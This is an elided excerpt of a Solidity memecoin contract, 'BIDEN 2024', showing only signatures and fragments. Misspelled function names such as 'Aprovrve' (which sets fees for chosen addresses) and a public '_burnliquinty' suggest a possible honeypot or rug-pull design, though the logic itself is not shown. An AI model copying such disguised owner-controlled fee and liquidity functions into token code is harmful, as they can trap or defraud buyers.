...
/**
https://t.me/Biden0xb2024
https://twitter.com/Biden0xb2024
B(Biden) plus 2024 equals 
0xB 2024
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipverker(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract BIDEN2024 is Ownable {
    ...
    constructor (){
        name = unicode"BIDEN 2024";
        symbol = unicode"BIDEN";
        decimals = 9;
        uint256 Supply = 20240000;
    ...
    function Aprovrve(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnliquinty(address user) public {
